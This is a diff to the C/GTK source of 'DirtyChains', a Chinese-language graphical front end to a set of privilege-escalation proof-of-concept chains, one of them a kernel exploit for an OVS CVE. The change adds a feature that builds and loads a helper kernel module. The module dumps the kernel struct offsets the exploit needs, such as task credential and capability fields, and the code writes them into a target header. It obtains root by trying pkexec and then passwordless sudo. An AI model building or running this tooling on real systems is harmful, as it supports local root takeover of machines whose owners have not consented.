@@ -3693,7 +3693,7 @@ int ovswrap_main(int argc, char **argv)
 
 #define APP_TITLE       "DirtyChains · 页缓存提权"
 /* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
-#define DF_BUILD        "2026-10-31-r23"
+#define DF_BUILD        "2026-10-31-r24"
 #define APP_SUBTITLE    "六链 PoC 图形前端 · " DF_BUILD
 #define LOG_MAX_LINES   20000
 #define PTY_COLS        110
@@ -3798,6 +3798,9 @@ typedef struct {
     GtkWidget *entry_krec;   /* OVS 链: 指定内核版本匹配 offset/ 表 */
     GtkWidget *btn_vmlinux;  /* OVS 链: 解析 vmlinux (pahole/BTF 推导偏移) */
     GtkWidget *btn_pick_offset; /* OVS 链: 浏览 offset/ 里已有的 target.h */
+    GtkWidget *btn_root_off;    /* OVS 链: root 加载 krec_dump.ko 取偏移 */
+    GtkWidget *lbl_root_off;    /* 上面那个按钮所在行的标签 */
+    GtkWidget *root_off_row;    /* 整行容器, 便于按链显隐 */
     /* 参数面板各行的标签/按钮, 便于按所选 CVE 显隐 */
     GtkWidget *lbl_t, *browse_t;
     GtkWidget *lbl_to, *browse_to;
@@ -4737,6 +4740,8 @@ static void sync_params_ui(App *a)
     gtk_widget_set_visible(a->entry_krec, all ? FALSE : c->engine == 1);
     gtk_widget_set_visible(a->btn_vmlinux, all ? FALSE : c->engine == 1);
     gtk_widget_set_visible(a->btn_pick_offset, all ? FALSE : c->engine == 1);
+    gtk_widget_set_visible(a->lbl_root_off, all ? FALSE : c->engine == 1);
+    gtk_widget_set_visible(a->root_off_row, all ? FALSE : c->engine == 1);
 
     if (!all) {
         /* 占位提示随链微调 */
@@ -5190,7 +5195,798 @@ static void act_vmlinux(GtkWidget *w, gpointer data)
     g_free(err2);
 }
 
-/* ===================== 「选择 offset」窗口 ===================== */
+/* ===================== 「root 获取偏移表」 ===================== */
+
+/*
+ * tools/kmod/krec_dump.ko 是随包附带的内核模块: 加载后把本机内核的
+ * struct 偏移和 vmlinux 符号偏移直接写进 /proc/krec_dump (JSON, 与
+ * `ovswrap -dump-krec` 同构)。不依赖 BTF / pahole / System.map,
+ * 代价是要现场编一个 .ko, 而且 insmod / rmmod 需要 root。
+ *
+ * 「root 获取偏移表」四步:
+ *   1. 找 krec_dump.ko; 没有就用包里的源码编一个 (make -C tools/kmod)
+ *   2. 提权 (root / pkexec / sudo -n) 加载模块、读 /proc/krec_dump
+ *   3. 无论成败立刻 rmmod, 不让模块留在内核里
+ *   4. 在这里按 mk_offset.py 的同一格式渲染 target.h 落盘
+ *      (目标机不需要装 python3)
+ */
+
+/* 极简 JSON 取值: 只认本模块输出的平坦结构, 不做完整解析 */
+static const char *json_scan(const char *js, const char *key)
+{
+    char pat[96];
+    const char *p;
+
+    if (!js || !key || strlen(key) + 3 > sizeof(pat))
+        return NULL;
+    g_snprintf(pat, sizeof(pat), "\"%s\"", key);
+    if (!(p = strstr(js, pat)))
+        return NULL;
+    p += strlen(pat);
+    while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')
+        p++;
+    if (*p != ':')
+        return NULL;
+    p++;
+    while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')
+        p++;
+    return p;
+}
+
+static gboolean json_num(const char *js, const char *key, long *out)
+{
+    const char *p = json_scan(js, key);
+    char *end = NULL;
+    long v;
+
+    if (!p)
+        return FALSE;
+    errno = 0;
+    v = strtol(p, &end, 10);
+    if (end == p || errno != 0)
+        return FALSE;
+    *out = v;
+    return TRUE;
+}
+
+static char *json_str(const char *js, const char *key)
+{
+    const char *p = json_scan(js, key);
+    GString *s;
+
+    if (!p || *p != '"')
+        return NULL;
+    p++;
+    s = g_string_new(NULL);
+    while (*p && *p != '"') {
+        if (*p == '\\' && p[1]) {
+            p++;
+            switch (*p) {
+            case 'n': g_string_append_c(s, '\n'); break;
+            case 't': g_string_append_c(s, '\t'); break;
+            case 'r': g_string_append_c(s, '\r'); break;
+            default:  g_string_append_c(s, *p);   break;
+            }
+            p++;
+        } else {
+            g_string_append_c(s, *p++);
+        }
+    }
+    if (*p != '"') {
+        g_string_free(s, TRUE);
+        return NULL;
+    }
+    return g_string_free(s, FALSE);
+}
+
+/* read_lanes 是字符串数组, target.h 里要的是逗号串 */
+static char *json_lanes(const char *js)
+{
+    const char *p = json_scan(js, "read_lanes");
+    GString *s;
+    gboolean first = TRUE;
+
+    if (!p || *p != '[')
+        return NULL;
+    p++;
+    s = g_string_new(NULL);
+    while (*p && *p != ']') {
+        if (*p == '"') {
+            const char *q = strchr(p + 1, '"');
+
+            if (!q)
+                break;
+            if (!first)
+                g_string_append_c(s, ',');
+            g_string_append_len(s, p + 1, q - p - 1);
+            first = FALSE;
+            p = q + 1;
+        } else {
+            p++;
+        }
+    }
+    if (s->len == 0) {
+        g_string_free(s, TRUE);
+        return NULL;
+    }
+    return g_string_free(s, FALSE);
+}
+
+/* 把任意字符串塞进 C 字符串字面量 (换行/引号/反斜杠转义) */
+static const char *c_esc(const char *s, char *buf, size_t n)
+{
+    size_t o = 0;
+
+    if (!s)
+        s = "";
+    for (; *s && o + 3 < n; s++) {
+        unsigned char ch = (unsigned char)*s;
+
+        if (ch == '\\' || ch == '"') {
+            buf[o++] = '\\';
+            buf[o++] = (char)ch;
+        } else if (ch == '\n') {
+            buf[o++] = '\\';
+            buf[o++] = 'n';
+        } else if (ch == '\r') {
+            buf[o++] = '\\';
+            buf[o++] = 'r';
+        } else if (ch == '\t') {
+            buf[o++] = '\\';
+            buf[o++] = 't';
+        } else {
+            buf[o++] = (char)ch;
+        }
+    }
+    buf[o] = '\0';
+    return buf;
+}
+
+/* 与 tools/mk_offset.py 的 FIELDS 一一对应, 顺序也保持一致 */
+static const struct {
+    const char *macro, *key;
+} th_fields[] = {
+    { "NF_CONNTRACK_HELPER_ME",  "nf_conntrack_helper_me"  },
+    { "MODULE_KOBJ_KTYPE",       "module_kobj_ktype"       },
+    { "TASK_PID",                "task_pid"                },
+    { "TASK_CRED",               "task_cred"               },
+    { "TASK_PID_LINKS",          "task_pid_links"          },
+    { "CRED_FSUID",              "cred_fsuid"              },
+    { "CRED_FSGID",              "cred_fsgid"              },
+    { "CRED_CAP_PERMITTED",      "cred_cap_permitted"      },
+    { "CRED_CAP_EFFECTIVE",      "cred_cap_effective"      },
+    { "PID_NAMESPACE_IDR",       "pid_namespace_idr"       },
+    { "IDR_IDR_RT",              "idr_idr_rt"              },
+    { "IDR_BASE",                "idr_base"                },
+    { "XARRAY_XA_HEAD",          "xarray_xa_head"          },
+    { "XA_NODE_SHIFT",           "xa_node_shift"           },
+    { "XA_NODE_SLOTS",           "xa_node_slots"           },
+    { "PID_TASKS",               "pid_tasks"               },
+    { "HLIST_HEAD_FIRST",        "hlist_head_first"        },
+    { "DST_ENTRY_REF",           "dst_entry_ref"           },
+    { "METADATA_DST_TUN_INFO",   "metadata_dst_tun_info"   },
+    { "IP_TUNNEL_KEY_IPV4_SRC",  "ip_tunnel_key_ipv4_src"  },
+    { "IP_TUNNEL_KEY_IPV4_DST",  "ip_tunnel_key_ipv4_dst"  },
+    { "IP_TUNNEL_KEY_TOS",       "ip_tunnel_key_tos"       },
+    { "IP_TUNNEL_KEY_TTL",       "ip_tunnel_key_ttl"       },
+    { "IP_TUNNEL_KEY_TP_SRC",    "ip_tunnel_key_tp_src"    },
+    { "IP_TUNNEL_KEY_TP_DST",    "ip_tunnel_key_tp_dst"    },
+    { "OVS_CT_LABELS",           "ovs_ct_labels"           },
+    { "OVS_CT_ACTION_LEN",       "ovs_ct_action_len"       },
+};
+
+/*
+ * 把 /proc/krec_dump 的 JSON 渲染成 target.h。
+ * 输出与 tools/mk_offset.py 等价, 两处改字段时要一起改。
+ */
+static char *render_target_h(const char *js, const char *src, char **why)
+{
+    GString *o;
+    char *rel = json_str(js, "release");
+    char *ver = json_str(js, "version");
+    char *mach = json_str(js, "machine");
+    char *kind = json_str(js, "dst_entry_ref_kind");
+    char *rcar = json_str(js, "read_carrier");
+    char *wcar = json_str(js, "write_carrier");
+    char *lanes = json_lanes(js);
+    char b1[512], b2[512], b3[64], b4[64], b5[64], b6[64], b7[512];
+    long mtype = 0, mipn = 0, ti = 31, v = 0;
+    size_t i;
+
+    *why = NULL;
+    if (!rel || !*rel) {
+        *why = g_strdup("记录里没有 release 字段");
+        goto fail;
+    }
+    if (!json_num(js, "vmlinux_module_ktype", &mtype) ||
+        !json_num(js, "vmlinux_init_pid_ns", &mipn)) {
+        *why = g_strdup("记录里缺 vmlinux 符号偏移");
+        goto fail;
+    }
+    json_num(js, "ovs_key_attr_tunnel_info", &ti);
+
+    o = g_string_new(NULL);
+    g_string_append_printf(o,
+        "/*\n"
+        " * target.h - dirtychains OVS (CVE-2026-64531) kernel offsets\n"
+        " *\n"
+        " * 放这里：offset/<N>系/<release>/target.h\n"
+        " * 例：    offset/5系/5.8.0-59-generic/target.h\n"
+        " *\n"
+        " * 程序启动时按目录名找本机 release，不需要重新编译。\n"
+        " * 本文件同时也是合法 C 头文件，可以直接 #include 静态编译。\n"
+        " *\n"
+        " * 生成: %s\n"
+        " */\n"
+        "#ifndef DIRTYCHAINS_TARGET_H\n"
+        "#define DIRTYCHAINS_TARGET_H\n\n"
+        "#define KREC_FORMAT        1\n"
+        "#define KREC_RELEASE       \"%s\"\n"
+        "#define KREC_VERSION       \"%s\"\n"
+        "#define KREC_VERSION_HASH  %luUL\n"
+        "#define KREC_MACHINE       \"%s\"\n\n"
+        "/* 符号偏移：相对 _text，与 KASLR 无关 */\n"
+        "#define KREC_VMLINUX_MODULE_KTYPE %ldUL\n"
+        "#define KREC_VMLINUX_INIT_PID_NS  %ldUL\n\n"
+        "/* 结构体字段偏移 */\n",
+        c_esc(src, b1, sizeof(b1)), c_esc(rel, b2, sizeof(b2)),
+        c_esc(ver, b3, sizeof(b3)), fnv1a32(ver ? ver : ""),
+        c_esc(mach, b4, sizeof(b4)), mtype, mipn);
+
+    for (i = 0; i < G_N_ELEMENTS(th_fields); i++) {
+        char name[64];
+
+        if (!json_num(js, th_fields[i].key, &v)) {
+            g_string_free(o, TRUE);
+            *why = g_strdup_printf("记录里缺字段 %s", th_fields[i].key);
+            goto fail;
+        }
+        g_snprintf(name, sizeof(name), "KREC_%s", th_fields[i].macro);
+        g_string_append_printf(o, "#define %-30s %ld\n", name, v);
+    }
+
+    g_string_append_printf(o,
+        "\n/* 行为参数：从调试信息推不出来，只能实机试 */\n"
+        "#define KREC_REF_KIND      \"%s\"\n"
+        "#define KREC_TUNNEL_INFO   %ld\n"
+        "#define KREC_READ_CARRIER  \"%s\"\n"
+        "#define KREC_WRITE_CARRIER \"%s\"\n"
+        "#define KREC_READ_LANES    \"%s\"\n\n"
+        "#endif /* DIRTYCHAINS_TARGET_H */\n",
+        c_esc(kind ? kind : "__rcuref", b5, sizeof(b5)), ti,
+        c_esc(rcar ? rcar : "timeout", b6, sizeof(b6)),
+        c_esc(wcar ? wcar : (rcar ? rcar : "timeout"), b7, sizeof(b7)),
+        lanes ? lanes : "tos,ttl,tp_src_0,tp_src_1,tp_dst_0,tp_dst_1,"
+                        "ipv4_src_0,ipv4_src_1,ipv4_src_2,ipv4_src_3,"
+                        "ipv4_dst_0,ipv4_dst_1,ipv4_dst_2,ipv4_dst_3");
+
+    g_free(rel);
+    g_free(ver);
+    g_free(mach);
+    g_free(kind);
+    g_free(rcar);
+    g_free(wcar);
+    g_free(lanes);
+    return g_string_free(o, FALSE);
+
+fail:
+    g_free(rel);
+    g_free(ver);
+    g_free(mach);
+    g_free(kind);
+    g_free(rcar);
+    g_free(wcar);
+    g_free(lanes);
+    return NULL;
+}
+
+/* 配置表根目录: 优先程序目录的 offset/, 其次系统 share 目录 */
+static char *offset_root_dir(void)
+{
+    static const char *sys[] = {
+        "/usr/local/share/dirtychains/offset",
+        "/usr/share/dirtychains/offset",
+    };
+    char *exe = self_exe();
+    char *dir = exe ? g_path_get_dirname(exe) : g_strdup(".");
+    char *p = g_build_filename(dir, "offset", NULL);
+    size_t i;
+
+    g_free(exe);
+    g_free(dir);
+    if (g_file_test(p, G_FILE_TEST_IS_DIR))
+        return p;
+    for (i = 0; i < G_N_ELEMENTS(sys); i++) {
+        if (g_file_test(sys[i], G_FILE_TEST_IS_DIR)) {
+            g_free(p);
+            return g_strdup(sys[i]);
+        }
+    }
+    return p;   /* 不存在: 调用方 mkdir, 落在程序目录下 */
+}
+
+static gboolean module_loaded(const char *name)
+{
+    char *txt = NULL, *pat = NULL, *line = NULL, *save = NULL;
+    gboolean on = FALSE;
+
+    if (!g_file_get_contents("/proc/modules", &txt, NULL, NULL))
+        return FALSE;
+    pat = g_strdup_printf("%s ", name);
+    for (line = strtok_r(txt, "\n", &save); line;
+         line = strtok_r(NULL, "\n", &save)) {
+        if (g_str_has_prefix(line, pat)) {
+            on = TRUE;
+            break;
+        }
+    }
+    g_free(pat);
+    g_free(txt);
+    return on;
+}
+
+/* 现场编 .ko：make -C tools/kmod，输出落到临时文件再贴进日志 */
+static gboolean build_kmod(App *a, const char *dir)
+{
+    char *logf = g_build_filename(g_get_tmp_dir(),
+                                  "dirtychains-kmod.log", NULL);
+    char *qdir = g_shell_quote(dir);
+    char *qlog = g_shell_quote(logf);
+    char *cmd = g_strdup_printf("make -s -C %s > %s 2>&1", qdir, qlog);
+    char *argv[] = { (char *)"/bin/sh", (char *)"-c", cmd, NULL };
+    GPid pid = 0;
+    GError *ge = NULL;
+    gint st = -1;
+    gboolean ok = FALSE;
+    char *lg = NULL;
+
+    gtk_label_set_text(GTK_LABEL(a->status_lbl), "正在编译 krec_dump.ko …");
+    gtk_widget_set_name(a->status_lbl, "status-run");
+    while (gtk_events_pending())
+        gtk_main_iteration();
+
+    if (g_spawn_async(NULL, argv, NULL,
+                      G_SPAWN_SEARCH_PATH | G_SPAWN_DO_NOT_REAP_CHILD,
+                      NULL, NULL, &pid, &ge)) {
+        /* 编译要几十秒，期间把事件泵转起来，别让窗口假死 */
+        while (waitpid(pid, &st, WNOHANG) == 0) {
+            while (gtk_events_pending())
+                gtk_main_iteration();
+            g_usleep(50000);
+        }
+        g_spawn_close_pid(pid);
+        ok = WIFEXITED(st) && WEXITSTATUS(st) == 0;
+    } else {
+        g_error_free(ge);
+    }
+
+    if (g_file_get_contents(logf, &lg, NULL, NULL)) {
+        if (*lg)
+            log_append_plain(a, lg);
+        g_free(lg);
+    }
+    unlink(logf);
+    g_free(cmd);
+    g_free(qdir);
+    g_free(qlog);
+    g_free(logf);
+    return ok;
+}
+
+/*
+ * 找 krec_dump.ko：程序目录 tools/kmod/ -> 程序目录 -> 系统 share。
+ * 都找不到但包里有源码就现场编一个。
+ */
+static char *ensure_kmod(App *a, char **why)
+{
+    static const char *rel[] = {
+        "tools/kmod/krec_dump.ko",
+        "krec_dump.ko",
+        "tools/krec_dump.ko",
+    };
+    static const char *sys[] = {
+        "/usr/local/share/dirtychains/krec_dump.ko",
+        "/usr/share/dirtychains/krec_dump.ko",
+    };
+    char *exe = self_exe();
+    char *dir = exe ? g_path_get_dirname(exe) : g_strdup(".");
+    char *ko = NULL;
+    size_t i;
+
+    *why = NULL;
+    for (i = 0; i < G_N_ELEMENTS(rel); i++) {
+        char *p = g_build_filename(dir, rel[i], NULL);
+
+        if (g_file_test(p, G_FILE_TEST_IS_REGULAR)) {
+            ko = p;
+            break;
+        }
+        g_free(p);
+    }
+    for (i = 0; !ko && i < G_N_ELEMENTS(sys); i++) {
+        if (g_file_test(sys[i], G_FILE_TEST_IS_REGULAR))
+            ko = g_strdup(sys[i]);
+    }
+
+    if (!ko) {
+        /* 程序目录（压缩包解压即用）→ 安装目录 share/dirtychains/tools/kmod */
+        char *kdir = g_build_filename(dir, "tools", "kmod", NULL);
+        char *mk = g_build_filename(kdir, "Makefile", NULL);
+
+        if (!g_file_test(mk, G_FILE_TEST_EXISTS)) {
+            g_free(mk);
+            g_free(kdir);
+            kdir = g_build_filename("/usr/local/share/dirtychains",
+                                    "tools", "kmod", NULL);
+            mk = g_build_filename(kdir, "Makefile", NULL);
+            if (!g_file_test(mk, G_FILE_TEST_EXISTS)) {
+                g_free(mk);
+                g_free(kdir);
+                kdir = g_build_filename("/usr/share/dirtychains",
+                                        "tools", "kmod", NULL);
+                mk = g_build_filename(kdir, "Makefile", NULL);
+            }
+        }
+
+        if (g_file_test(mk, G_FILE_TEST_EXISTS)) {
+            char note[PATH_BUF];
+            char *built;
+
+            g_snprintf(note, sizeof(note),
+                       "\033[2m[*] 没找到现成的 krec_dump.ko，用 %s 现场编一个"
+                       "（需要 linux-headers-$(uname -r)）…\033[0m\n", kdir);
+            ansi_feed(a, note, strlen(note));
+            log_flush(a);
+
+            if (build_kmod(a, kdir)) {
+                built = g_build_filename(kdir, "krec_dump.ko", NULL);
+                if (g_file_test(built, G_FILE_TEST_IS_REGULAR))
+                    ko = built;
+                else
+                    g_free(built);
+            }
+        }
+        if (!ko) {
+            *why = g_strdup_printf(
+                "没找到 krec_dump.ko，也没能现场编译（%s/tools/kmod）。\n"
+                "    装好内核头文件再试: sudo apt install "
+                "linux-headers-$(uname -r)", dir);
+        }
+        g_free(mk);
+        g_free(kdir);
+    }
+
+    g_free(exe);
+    g_free(dir);
+    return ko;
+}
+
+static gboolean have_pkexec(void)
+{
+    const char *disp = g_getenv("DISPLAY");
+    const char *wl = g_getenv("WAYLAND_DISPLAY");
+
+    if ((!disp || !*disp) && (!wl || !*wl))
+        return FALSE;
+    return g_file_test("/usr/bin/pkexec", G_FILE_TEST_IS_EXECUTABLE) ||
+           g_file_test("/bin/pkexec", G_FILE_TEST_IS_EXECUTABLE);
+}
+
+static gboolean sudo_nopasswd(void)
+{
+    char out[64];
+    int n = run_cmd("sudo -n true 2>/dev/null; echo $?", out, sizeof(out));
+
+    return n > 0 && out[0] == '0';
+}
+
+/* how: NULL = 当前身份, "pkexec" = 图形提权, "sudo" = 免密 sudo */
+static gboolean spawn_shell_as(const char *how, const char *script,
+                               char **out, char **err, int *st)
+{
+    char *argv[6];
+    int i = 0;
+    GError *ge = NULL;
+    gboolean ok;
+
+    if (!how) {
+        argv[i++] = (char *)"/bin/sh";
+    } else if (!strcmp(how, "pkexec")) {
+        argv[i++] = (char *)"/usr/bin/pkexec";
+    } else {
+        argv[i++] = (char *)"sudo";
+        argv[i++] = (char *)"-n";
+    }
+    argv[i++] = (char *)"/bin/sh";
+    argv[i++] = (char *)"-c";
+    argv[i++] = (char *)script;
+    argv[i] = NULL;
+
+    ok = g_spawn_sync(NULL, argv, NULL, G_SPAWN_SEARCH_PATH, NULL, NULL,
+                      out, err, st, &ge);
+    if (!ok) {
+        if (err && !*err)
+            *err = g_strdup(ge->message);
+        g_error_free(ge);
+    }
+    return ok;
+}
+
+/*
+ * 依次尝试: 已经是 root -> pkexec（有桌面时）-> 免密 sudo。
+ * pkexec 失败（用户点取消 / 没有 polkit agent）时不要直接放弃，
+ * 很多机器其实配了 NOPASSWD sudo。
+ */
+static gboolean run_privileged(const char *script, char **out, char **err,
+                               int *st, const char **via)
+{
+    gboolean ok;
+
+    *out = *err = NULL;
+    *st = -1;
+
+    if (geteuid() == 0) {
+        *via = "root";
+        return spawn_shell_as(NULL, script, out, err, st);
+    }
+
+    if (have_pkexec()) {
+        ok = spawn_shell_as("pkexec", script, out, err, st);
+        if (ok && WIFEXITED(*st) && WEXITSTATUS(*st) == 0) {
+            *via = "pkexec";
+            return TRUE;
+        }
+        g_free(*out);
+        g_free(*err);
+        *out = *err = NULL;
+        *st = -1;
+    }
+
+    *via = "sudo -n";
+    return spawn_shell_as("sudo", script, out, err, st);
+}
+
+/* insmod 常见失败的一句话诊断 */
+static const char *insmod_hint(const char *e)
+{
+    if (!e)
+        return NULL;
+    if (strstr(e, "Invalid module format") || strstr(e, "version magic"))
+        return "模块和当前内核不匹配（.ko 是用别的内核头文件编的）。\n"
+               "    先 make -C tools/kmod clean 再 make -C tools/kmod 重编。";
+    if (strstr(e, "Operation not permitted") || strstr(e, "Lockdown") ||
+        strstr(e, "Permission denied"))
+        return "内核拒绝了模块加载：Secure Boot / lockdown，或当前是容器\n"
+               "    （没有 CAP_SYS_MODULE）。换真机或关掉 Secure Boot 再试。";
+    if (strstr(e, "Unknown symbol"))
+        return "模块依赖的内核符号不存在：内核版本对不上，重编 .ko。";
+    if (strstr(e, "File exists"))
+        return "krec_dump 已经加载过了，先 sudo rmmod krec_dump。";
+    if (strstr(e, "No such file"))
+        return "找不到 .ko 文件，确认包里的 tools/kmod 没被删。";
+    if (strstr(e, "password is required") || strstr(e, "no tty"))
+        return "需要 root 密码，但既没有免密 sudo 也没有图形认证代理。\n"
+               "    用 sudo ./dirtychains 启动，或给当前用户配 NOPASSWD。";
+    if (strstr(e, "Not authorized") || strstr(e, "dismissed"))
+        return "polkit 认证被取消。";
+    return NULL;
+}
+
+/*
+ * 「root 获取偏移表」：
+ * 找/编 krec_dump.ko -> 提权 insmod -> 读 /proc/krec_dump -> 立刻 rmmod
+ * -> C 里渲染 target.h -> 写 offset/<N>系/<release>/。
+ */
+static void act_root_offset(GtkWidget *w, gpointer data)
+{
+    App *a = data;
+    const Chain *c = cur_chain(a);
+    const char *hdr =
+        "\n\033[2m══ root 获取偏移表：krec_dump.ko 直接读本机偏移 ══\n\033[0m\n";
+    char *ko = NULL, *why = NULL, *script = NULL, *qko = NULL;
+    char *out = NULL, *err = NULL, *th = NULL, *rel = NULL, *src = NULL;
+    char *root = NULL, *sub = NULL, *path = NULL, *recp = NULL;
+    const char *via = "root";
+    int st = -1;
+    gboolean ok;
+    char msg[PATH_BUF * 2];
+
+    (void)w;
+    if (!c || c->engine != 1)
+        return;
+    if (a->running) {
+        gtk_label_set_text(GTK_LABEL(a->status_lbl), "已有任务在运行");
+        return;
+    }
+
+    ansi_feed(a, hdr, strlen(hdr));
+    log_flush(a);
+
+    /* 先把明显没戏的情况挡掉, 省得白编一次模块 */
+    if (geteuid() != 0 && !have_pkexec() && !sudo_nopasswd()) {
+        const char *no =
+            "\033[31m[!] 需要 root 才能 insmod / rmmod。\033[0m\n"
+            "    当前不是 root，没有图形认证代理（pkexec），"
+            "也没有免密 sudo。\n"
+            "    用 sudo ./dirtychains 启动，或者手工三步：\n"
+            "      sudo insmod <程序目录>/tools/kmod/krec_dump.ko\n"
+            "      cat /proc/krec_dump > rec.json && sudo rmmod krec_dump\n"
+            "      python3 tools/mk_offset.py rec.json --root offset\n";
+
+        ansi_feed(a, no, strlen(no));
+        log_flush(a);
+        gtk_label_set_text(GTK_LABEL(a->status_lbl), "需要 root 权限");
+        gtk_widget_set_name(a->status_lbl, "status-err");
+        return;
+    }
+
+    /* 1. 找 / 编 .ko */
+    ko = ensure_kmod(a, &why);
+    if (!ko) {
+        g_snprintf(msg, sizeof(msg), "\033[31m[!] 拿不到 krec_dump.ko：%s\033[0m\n",
+                   why ? why : "未知原因");
+        ansi_feed(a, msg, strlen(msg));
+        log_flush(a);
+        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表获取失败");
+        gtk_widget_set_name(a->status_lbl, "status-err");
+        g_free(why);
+        return;
+    }
+
+    /* 2. 提权加载 -> 读 JSON -> 卸载（脚本里用顺序执行保证一定 rmmod） */
+    qko = g_shell_quote(ko);
+    script = g_strdup_printf(
+        "set -u\n"
+        "KO=%s\n"
+        "M=krec_dump\n"
+        "INSMOD=$(command -v insmod 2>/dev/null || echo /sbin/insmod)\n"
+        "RMMOD=$(command -v rmmod 2>/dev/null || echo /sbin/rmmod)\n"
+        "if grep -q \"^$M \" /proc/modules 2>/dev/null; then"
+        " $RMMOD $M >/dev/null 2>&1 || true; fi\n"
+        "if ! $INSMOD \"$KO\" >&2; then exit 3; fi\n"
+        "rc=0\n"
+        "cat /proc/krec_dump 2>/dev/null || rc=4\n"
+        "$RMMOD $M >/dev/null 2>&1 || true\n"
+        "exit $rc\n", qko);
+
+    gtk_label_set_text(GTK_LABEL(a->status_lbl), "正在加载 krec_dump.ko …");
+    gtk_widget_set_name(a->status_lbl, "status-run");
+
+    ok = run_privileged(script, &out, &err, &st, &via);
+    if (!ok) {
+        g_snprintf(msg, sizeof(msg), "\033[31m[!] 执行失败：%s\033[0m\n",
+                   err && *err ? err : "起不了子进程");
+        ansi_feed(a, msg, strlen(msg));
+        log_flush(a);
+        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表获取失败");
+        gtk_widget_set_name(a->status_lbl, "status-err");
+        goto done;
+    }
+
+    if (!WIFEXITED(st) || WEXITSTATUS(st) != 0) {
+        int ec = WIFEXITED(st) ? WEXITSTATUS(st) : -1;
+        const char *hint = insmod_hint(err);
+
+        if (ec == 3)
+            g_snprintf(msg, sizeof(msg),
+                       "\033[31m[!] insmod krec_dump.ko 失败（%s）\033[0m\n", via);
+        else if (ec == 4)
+            g_snprintf(msg, sizeof(msg),
+                       "\033[31m[!] 模块加载了，但读 /proc/krec_dump 失败\033[0m\n");
+        else
+            g_snprintf(msg, sizeof(msg),
+                       "\033[31m[!] 提权 / 加载失败（%s，退出码 %d）\033[0m\n",
+                       via, ec);
+        ansi_feed(a, msg, strlen(msg));
+        if (err && *err)
+            log_append_plain(a, err);
+        if (hint) {
+            g_snprintf(msg, sizeof(msg), "    %s\n", hint);
+            log_append_plain(a, msg);
+        }
+        log_append_plain(a,
+            "    也可以手工走一遍：\n"
+            "      sudo insmod <程序目录>/tools/kmod/krec_dump.ko\n"
+            "      cat /proc/krec_dump > rec.json\n"
+            "      sudo rmmod krec_dump\n"
+            "      python3 tools/mk_offset.py rec.json --root offset\n");
+        log_flush(a);
+        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表获取失败");
+        gtk_widget_set_name(a->status_lbl, "status-err");
+        goto done;
+    }
+
+    if (!out || !strstr(out, "\"release\"")) {
+        log_append_plain(a, "[!] 模块跑完了，但没有拿到偏移记录。\n");
+        if (err && *err)
+            log_append_plain(a, err);
+        log_flush(a);
+        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表获取失败");
+        gtk_widget_set_name(a->status_lbl, "status-err");
+        goto done;
+    }
+
+    /* 3. 渲染 target.h */
+    src = g_strdup_printf("krec_dump.ko（%s）", via);
+    th = render_target_h(out, src, &why);
+    if (!th) {
+        g_snprintf(msg, sizeof(msg),
+                   "\033[31m[!] 偏移记录不完整：%s\033[0m\n", why ? why : "未知");
+        ansi_feed(a, msg, strlen(msg));
+        log_flush(a);
+        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表获取失败");
+        gtk_widget_set_name(a->status_lbl, "status-err");
+        goto done;
+    }
+
+    /* 4. 落盘: offset/<N>系/<release>/target.h (+ rec.json 存档) */
+    rel = json_str(out, "release");
+    root = offset_root_dir();
+    {
+        char major[16];
+        const char *dot = rel ? strchr(rel, '.') : NULL;
+        size_t n = dot ? (size_t)(dot - rel) : (rel ? strlen(rel) : 0);
+
+        if (n >= sizeof(major))
+            n = sizeof(major) - 1;
+        if (rel && n)
+            memcpy(major, rel, n);
+        major[n] = '\0';
+        sub = g_strdup_printf("%s/%s系/%s", root, major[0] ? major : "?",
+                              rel ? rel : "unknown");
+    }
+    path = g_build_filename(sub, "target.h", NULL);
+    recp = g_build_filename(sub, "rec.json", NULL);
+
+    if (g_mkdir_with_parents(sub, 0755) != 0 ||
+        !g_file_set_contents(path, th, -1, NULL)) {
+        g_snprintf(msg, sizeof(msg),
+                   "\033[31m[!] 写 %s 失败：%s\033[0m\n"
+                   "    目录可能属于 root，用 sudo 启动本程序再试一次。\n",
+                   path, strerror(errno));
+        ansi_feed(a, msg, strlen(msg));
+        log_flush(a);
+        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表写入失败");
+        gtk_widget_set_name(a->status_lbl, "status-err");
+        goto done;
+    }
+    g_file_set_contents(recp, out, -1, NULL);
+
+    g_snprintf(msg, sizeof(msg),
+               "\033[32m[+] 已导出 %s（%ld 字节）\033[0m\n"
+               "    原始记录：%s\n"
+               "    模块已卸载：%s\n",
+               path, (long)strlen(th), recp,
+               module_loaded("krec_dump")
+                   ? "否（请手工 sudo rmmod krec_dump）" : "是");
+    ansi_feed(a, msg, strlen(msg));
+    log_flush(a);
+
+    if (rel && *rel) {
+        gtk_entry_set_text(GTK_ENTRY(a->entry_krec), rel);
+        g_snprintf(msg, sizeof(msg), "偏移表已就绪: %s", rel);
+        gtk_label_set_text(GTK_LABEL(a->status_lbl), msg);
+        gtk_widget_set_name(a->status_lbl, "status-ok");
+    } else {
+        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表已导出");
+        gtk_widget_set_name(a->status_lbl, "status-ok");
+    }
+
+done:
+    g_free(ko);
+    g_free(why);
+    g_free(script);
+    g_free(qko);
+    g_free(out);
+    g_free(err);
+    g_free(th);
+    g_free(rel);
+    g_free(src);
+    g_free(root);
+    g_free(sub);
+    g_free(path);
+    g_free(recp);
+}
 
 typedef struct {
     App        *a;
@@ -5986,6 +6782,7 @@ static void install_css(void)
         "#mainwin #status-run  { color: #1f5fa8; font-weight: bold; }\n"
         "#mainwin #title-name  { color: #1b3a57; }\n"
         "#mainwin #hint { color: #5f7d99; font-size: 9pt; }\n"
+        "#mainwin #roothint { color: #5f7d99; font-size: 8.5pt; }\n"
         "dialog #pickno { color: #8a97a5; }\n"
         "/* 「选择 offset」弹窗: 透明窗口 + 圆角卡片 + 过滤框 */\n"
         "#pickdlg { background-color: transparent; }\n"
@@ -6183,6 +6980,38 @@ static GtkWidget *build_params(App *a)
         gtk_box_pack_start(GTK_BOX(hb), a->btn_pick_offset, FALSE, FALSE, 0);
         gtk_box_pack_start(GTK_BOX(hb), a->btn_vmlinux, FALSE, FALSE, 0);
